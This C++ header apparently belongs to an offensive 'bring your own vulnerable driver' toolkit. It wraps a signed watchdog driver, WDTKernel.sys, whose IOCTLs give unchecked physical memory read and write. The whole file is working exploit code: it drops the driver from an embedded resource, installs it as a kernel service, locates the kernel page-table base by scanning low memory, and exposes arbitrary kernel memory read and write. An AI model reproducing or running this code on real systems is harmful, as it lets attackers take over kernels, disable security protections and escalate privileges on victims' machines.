#pragma once
// ============================================================
// wdtkernel.h — WDTKernel.sys (Dell Watchdog Timer) BYOVD Provider
// WHQL attestation signed by Microsoft — loads with HVCI enabled.
// Arbitrary physical memory R/W via MmMapIoSpace with zero
// validation on user-supplied addresses.
// Device path: \\.\__WDT__
//
// Since this driver operates on PHYSICAL addresses (like CorMem),
// ReadBuffer/WriteBuffer translate kernel VA → PA via page table
// walk before issuing IOCTLs.
// ============================================================

#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>
#include "driver_provider.h"

namespace BYOVD
{
    // WDTKernel.sys IOCTL codes — physical memory via MmMapIoSpace
    constexpr DWORD WDT_READ_DWORD   = 0x9C412400;
    constexpr DWORD WDT_READ_WORD    = 0x9C412404;
    constexpr DWORD WDT_READ_BYTE    = 0x9C412408;
    constexpr DWORD WDT_WRITE_DWORD  = 0x9C41240C;
    constexpr DWORD WDT_WRITE_WORD   = 0x9C412410;
    constexpr DWORD WDT_WRITE_BYTE   = 0x9C412414;
    // Bulk operations
    constexpr DWORD WDT_BULK_READ_DWORD  = 0x9C412418;
    constexpr DWORD WDT_BULK_READ_BYTE   = 0x9C412420;
    constexpr DWORD WDT_BULK_WRITE_DWORD = 0x9C412424;
    constexpr DWORD WDT_BULK_WRITE_BYTE  = 0x9C41242C;

    // Page table constants (shared with CorMem)
    namespace WDTPage
    {
        constexpr uint64_t PRESENT    = 0x1;
        constexpr uint64_t LARGE      = 0x80;
        constexpr uint64_t SIZE_4KB   = 0x1000ULL;
        constexpr uint64_t SIZE_2MB   = 0x200000ULL;
        constexpr uint64_t SIZE_1GB   = 0x40000000ULL;
        constexpr uint64_t PFN_MASK   = 0x000FFFFFFFFFF000ULL;
    }

    // Processor startup block signatures for DTB discovery
    namespace WDTPSB
    {
        constexpr uint64_t SIG_MASK     = 0xffffffffffff00ffULL;
        constexpr uint64_t SIG_VALUE    = 0x00000001000600E9ULL;
        constexpr uint64_t KVA_MASK     = 0xfffff80000000003ULL;
        constexpr uint64_t KVA_EXPECT   = 0xfffff80000000000ULL;
        constexpr uint64_t PML4_BAD     = 0xffffff0000000fffULL;
    }

    #pragma pack(push, 1)
    struct WDT_READ_INPUT
    {
        UINT64 PhysicalAddress;
    };

    struct WDT_WRITE_INPUT
    {
        UINT64 PhysicalAddress;
        DWORD  Value;
    };

    struct WDT_BULK_READ_INPUT
    {
        UINT64 PhysicalAddress;
        DWORD  Count;
    };

    struct WDT_BULK_WRITE_HEADER
    {
        UINT64 PhysicalAddress;
        DWORD  Count;
    };
    #pragma pack(pop)

    class WDTKernelProvider : public IDriverProvider
    {
        HANDLE   m_hDevice   = INVALID_HANDLE_VALUE;
        uint64_t m_systemDTB = 0;

        static constexpr const wchar_t* SVC_NAME  = L"WDTcs2";
        static constexpr const wchar_t* DEV_PATH  = L"\\\\.\\__WDT__";
        static constexpr const char*    DISP_NAME = "WDTKernel";

    public:
        const wchar_t* ServiceName() const override { return SVC_NAME; }
        const char*    DisplayName() const override  { return DISP_NAME; }

        bool Open() override
        {
            m_hDevice = CreateFileW(
                DEV_PATH,
                GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING, 0, nullptr);

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] WDTKernel device not found, loading driver...\n");
                if (!LoadDriver())
                    return false;

                m_hDevice = CreateFileW(
                    DEV_PATH,
                    GENERIC_READ | GENERIC_WRITE,
                    0, nullptr, OPEN_EXISTING, 0, nullptr);
            }

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] Failed to open WDTKernel device (0x%lX)\n", GetLastError());
                return false;
            }

            // Discover system DTB for VA→PA translation
            if (!FindSystemDTB())
            {
                printf("[BYOVD] System DTB discovery failed\n");
                Close();
                return false;
            }

            printf("[BYOVD] WDTKernel opened — DTB=0x%llX\n",
                   (unsigned long long)m_systemDTB);
            return true;
        }

        void Close() override
        {
            if (m_hDevice != INVALID_HANDLE_VALUE)
            {
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
            }
            m_systemDTB = 0;
        }

        bool IsOpen() const override { return m_hDevice != INVALID_HANDLE_VALUE; }

        // Read buffer at kernel VIRTUAL address (VA→PA translation + physical read)
        bool ReadBuffer(uintptr_t address, void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!m_systemDTB) return false;

            auto* dst = static_cast<uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(m_systemDTB, va);
                if (!pa) return false;

                // Don't cross page boundaries
                size_t chunk = min(remaining,
                    (size_t)(WDTPage::SIZE_4KB - (va & 0xFFF)));
                if (!ReadPhysical(pa, dst, chunk)) return false;

                dst += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        // Write buffer at kernel VIRTUAL address (VA→PA translation + physical write)
        bool WriteBuffer(uintptr_t address, const void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!m_systemDTB) return false;

            auto* src = static_cast<const uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(m_systemDTB, va);
                if (!pa) return false;

                size_t chunk = min(remaining,
                    (size_t)(WDTPage::SIZE_4KB - (va & 0xFFF)));
                if (!WritePhysical(pa, src, chunk)) return false;

                src += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        ~WDTKernelProvider() override { Close(); }

    private:
        // ---- Physical memory R/W (via IOCTL) ----

        bool ReadPhysical(uint64_t physAddr, void* buffer, size_t size)
        {
            auto* dst = static_cast<uint8_t*>(buffer);
            size_t offset = 0;

            // DWORD-aligned bulk read for the main body
            while (offset + 4 <= size)
            {
                size_t chunkBytes = min(size - offset, (size_t)4096) & ~(size_t)3;
                if (chunkBytes == 0) break;
                DWORD count = (DWORD)(chunkBytes / 4);

                WDT_BULK_READ_INPUT inp{};
                inp.PhysicalAddress = physAddr + offset;
                inp.Count = count;

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(m_hDevice, WDT_BULK_READ_DWORD,
                    &inp, sizeof(inp),
                    dst + offset, (DWORD)chunkBytes,
                    &bytesReturned, nullptr))
                {
                    // Fallback to single reads
                    for (size_t i = 0; i < chunkBytes; i += 4)
                    {
                        if (!ReadSingle(physAddr + offset + i, dst + offset + i, 4))
                            return false;
                    }
                }
                offset += chunkBytes;
            }

            // Remaining bytes
            while (offset < size)
            {
                if (!ReadSingle(physAddr + offset, dst + offset, 1))
                    return false;
                offset += 1;
            }
            return true;
        }

        bool WritePhysical(uint64_t physAddr, const void* buffer, size_t size)
        {
            auto* src = static_cast<const uint8_t*>(buffer);
            size_t offset = 0;

            // DWORD-aligned bulk write
            while (offset + 4 <= size)
            {
                size_t chunkBytes = min(size - offset, (size_t)4096) & ~(size_t)3;
                if (chunkBytes == 0) break;
                DWORD count = (DWORD)(chunkBytes / 4);

                size_t inputSize = sizeof(WDT_BULK_WRITE_HEADER) + chunkBytes;
                std::vector<uint8_t> inputBuf(inputSize);
                auto* hdr = reinterpret_cast<WDT_BULK_WRITE_HEADER*>(inputBuf.data());
                hdr->PhysicalAddress = physAddr + offset;
                hdr->Count = count;
                memcpy(inputBuf.data() + sizeof(WDT_BULK_WRITE_HEADER),
                       src + offset, chunkBytes);

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(m_hDevice, WDT_BULK_WRITE_DWORD,
                    inputBuf.data(), (DWORD)inputSize,
                    nullptr, 0,
                    &bytesReturned, nullptr))
                {
                    // Fallback to single writes
                    for (size_t i = 0; i < chunkBytes; i += 4)
                    {
                        if (!WriteSingle(physAddr + offset + i, src + offset + i, 4))
                            return false;
                    }
                }
                offset += chunkBytes;
            }

            // Remaining bytes
            while (offset < size)
            {
                if (!WriteSingle(physAddr + offset, src + offset, 1))
                    return false;
                offset += 1;
            }
            return true;
        }

        // Single-value IOCTL helpers
        bool ReadSingle(uint64_t physAddr, void* out, DWORD width)
        {
            WDT_READ_INPUT inp{};
            inp.PhysicalAddress = physAddr;

            DWORD ioctl;
            switch (width)
            {
            case 4: ioctl = WDT_READ_DWORD; break;
            case 2: ioctl = WDT_READ_WORD;  break;
            default: ioctl = WDT_READ_BYTE; width = 1; break;
            }

            BYTE outBuf[4]{};
            DWORD bytesReturned = 0;
            if (!DeviceIoControl(m_hDevice, ioctl,
                &inp, sizeof(inp),
                outBuf, sizeof(outBuf),
                &bytesReturned, nullptr))
                return false;

            memcpy(out, outBuf, width);
            return true;
        }

        bool WriteSingle(uint64_t physAddr, const void* data, DWORD width)
        {
            WDT_WRITE_INPUT inp{};
            inp.PhysicalAddress = physAddr;
            inp.Value = 0;

            DWORD ioctl;
            switch (width)
            {
            case 4: ioctl = WDT_WRITE_DWORD; break;
            case 2: ioctl = WDT_WRITE_WORD;  break;
            default: ioctl = WDT_WRITE_BYTE; width = 1; break;
            }

            memcpy(&inp.Value, data, width);

            DWORD bytesReturned = 0;
            return DeviceIoControl(m_hDevice, ioctl,
                &inp, sizeof(inp),
                nullptr, 0,
                &bytesReturned, nullptr) != 0;
        }

        // ---- Page table walking (VA → PA) ----

        uint64_t TranslateVA(uint64_t dtb, uint64_t va)
        {
            uint64_t pml4Idx = (va >> 39) & 0x1FF;
            uint64_t pdptIdx = (va >> 30) & 0x1FF;
            uint64_t pdIdx   = (va >> 21) & 0x1FF;
            uint64_t ptIdx   = (va >> 12) & 0x1FF;
            uint64_t offset  = va & 0xFFF;

            uint64_t pml4e = 0;
            if (!ReadPhysical((dtb & ~0xFFFULL) + pml4Idx * 8, &pml4e, 8)
                || !(pml4e & WDTPage::PRESENT))
                return 0;

            uint64_t pdpte = 0;
            if (!ReadPhysical((pml4e & WDTPage::PFN_MASK) + pdptIdx * 8, &pdpte, 8)
                || !(pdpte & WDTPage::PRESENT))
                return 0;
            if (pdpte & WDTPage::LARGE)
                return (pdpte & 0x000FFFFFC0000000ULL) + (va & (WDTPage::SIZE_1GB - 1));

            uint64_t pde = 0;
            if (!ReadPhysical((pdpte & WDTPage::PFN_MASK) + pdIdx * 8, &pde, 8)
                || !(pde & WDTPage::PRESENT))
                return 0;
            if (pde & WDTPage::LARGE)
                return (pde & 0x000FFFFFFFE00000ULL) + (va & (WDTPage::SIZE_2MB - 1));

            uint64_t pte = 0;
            if (!ReadPhysical((pde & WDTPage::PFN_MASK) + ptIdx * 8, &pte, 8)
                || !(pte & WDTPage::PRESENT))
                return 0;

            return (pte & WDTPage::PFN_MASK) + offset;
        }

        // ---- System DTB discovery ----
        // Scan low 1MB of physical memory for processor startup block

        bool FindSystemDTB()
        {
            auto* lowStub = new(std::nothrow) uint8_t[0x100000];
            if (!lowStub) return false;

            for (uint32_t off = 0; off < 0x100000; off += 0x1000)
            {
                if (!ReadPhysical(off, lowStub + off, 0x1000))
                    memset(lowStub + off, 0, 0x1000);
            }

            bool found = false;
            for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000)
            {
                uint64_t sig = *reinterpret_cast<uint64_t*>(lowStub + off);
                if ((sig & WDTPSB::SIG_MASK) != WDTPSB::SIG_VALUE)
                    continue;

                uint64_t kernEntry = *reinterpret_cast<uint64_t*>(lowStub + off + 0x70);
                if ((kernEntry & WDTPSB::KVA_MASK) != WDTPSB::KVA_EXPECT)
                    continue;

                uint64_t pml4 = *reinterpret_cast<uint64_t*>(lowStub + off + 0xA0);
                if (pml4 & WDTPSB::PML4_BAD || pml4 == 0 || pml4 > 0x100000000ULL)
                    continue;

                // Validate the PML4 page
                uint64_t pml4Page[512] = {};
                if (ReadPhysical(pml4, pml4Page, sizeof(pml4Page)))
                {
                    uint32_t valid = 0, kernel = 0;
                    for (int i = 0; i < 512; i++)
                    {
                        if (!(pml4Page[i] & WDTPage::PRESENT)) continue;
                        uint64_t pfn = pml4Page[i] & WDTPage::PFN_MASK;
                        if (pfn >= 0x8000000000ULL) continue;
                        valid++;
                        if (i >= 256) kernel++;
                    }
                    if (valid > 0 && kernel > 0)
                    {
                        m_systemDTB = pml4;
                        found = true;
                        break;
                    }
                }
            }

            delete[] lowStub;
            return found;
        }

        // ---- Driver loading via SCM ----

        bool LoadDriver()
        {
            wchar_t drvPath[MAX_PATH];
            GetTempPathW(MAX_PATH, drvPath);
            wcscat_s(drvPath, L"WDTKernel.sys");

            // Try embedded resource first (ID 104 = WDTKernel.sys)
            bool extracted = false;
            HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(104), MAKEINTRESOURCEW(10));
            if (hRes)
            {
                HGLOBAL hData = LoadResource(nullptr, hRes);
                DWORD sz = SizeofResource(nullptr, hRes);
                auto* ptr = static_cast<const BYTE*>(LockResource(hData));
                if (ptr && sz)
                {
                    HANDLE hf = CreateFileW(drvPath, GENERIC_WRITE, 0, nullptr,
                                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf != INVALID_HANDLE_VALUE)
                    {
                        DWORD wr = 0;
                        WriteFile(hf, ptr, sz, &wr, nullptr);
                        CloseHandle(hf);
                        extracted = (wr == sz);
                    }
                }
            }

            if (!extracted)
            {
                wchar_t selfDir[MAX_PATH];
                GetModuleFileNameW(nullptr, selfDir, MAX_PATH);
                wchar_t* sl = wcsrchr(selfDir, L'\\');
                if (sl) *(sl + 1) = L'\0';
                wcscat_s(selfDir, L"WDTKernel.sys");

                if (GetFileAttributesW(selfDir) == INVALID_FILE_ATTRIBUTES)
                {
                    printf("[BYOVD] WDTKernel.sys not available (no resource, no file)\n");
                    return false;
                }
                CopyFileW(selfDir, drvPath, FALSE);
            }

            SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
            if (!scm)
            {
                printf("[BYOVD] OpenSCManager failed (run as Admin)\n");
                return false;
            }

            SC_HANDLE existing = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
            if (existing)
            {
                SERVICE_STATUS ss;
                ControlService(existing, SERVICE_CONTROL_STOP, &ss);
                DeleteService(existing);
                CloseServiceHandle(existing);
                Sleep(1000);
            }

            SC_HANDLE svc = CreateServiceW(
                scm, SVC_NAME, SVC_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);

            if (!svc)
            {
                DWORD err = GetLastError();
                if (err == ERROR_SERVICE_MARKED_FOR_DELETE)
                {
                    printf("[BYOVD] Service marked for delete — waiting...\n");
                    for (int retries = 0; retries < 40; ++retries)
                    {
                        Sleep(250);
                        svc = CreateServiceW(
                            scm, SVC_NAME, SVC_NAME,
                            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                            drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                        if (svc) break;
                        err = GetLastError();
                        if (err == ERROR_SERVICE_EXISTS)
                        {
                            svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                            break;
                        }
                        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) break;
                    }
                }
                else if (err == ERROR_SERVICE_EXISTS)
                {
                    svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                }

                if (!svc)
                {
                    printf("[BYOVD] CreateService failed: 0x%lX\n", GetLastError());
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            if (!StartServiceW(svc, 0, nullptr))
            {
                DWORD err = GetLastError();
                if (err != ERROR_SERVICE_ALREADY_RUNNING)
                {
                    printf("[BYOVD] StartService failed: 0x%lX\n", err);
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            printf("[BYOVD] WDTKernel.sys loaded successfully (WHQL signed)\n");
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return true;
        }
    };

    inline void UnloadWDTKernelDriver()
    {
        UnloadDriverService(L"WDTcs2", L"WDTKernel.sys");
    }
}
